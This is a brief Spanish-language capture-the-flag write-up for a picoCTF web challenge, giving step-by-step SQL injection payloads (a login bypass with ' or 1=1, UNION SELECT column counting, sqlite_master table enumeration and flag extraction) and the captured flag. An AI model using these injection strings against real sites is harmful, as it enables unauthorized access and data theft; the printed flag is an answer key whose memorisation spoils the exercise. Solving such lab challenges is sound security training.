### Descripción
Can you find the flag on this website.
### Solución
1. Colocar en el campo de usuario y password: 
```
admin' or 1=1;
```
2. hola' union select 1,2,3; → verificamos la cantidad de columnas
3. hola' union select 1,2,tbl_name FROM sqlite_master; → entramos a la estructura de la bd, ver que tablas hay
4. hola' union select 1,id,flag FROM more_table; → entramos a la tabla que contiene la información de la flag

**Flag**: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}
### Notas Adicionales

### Referencias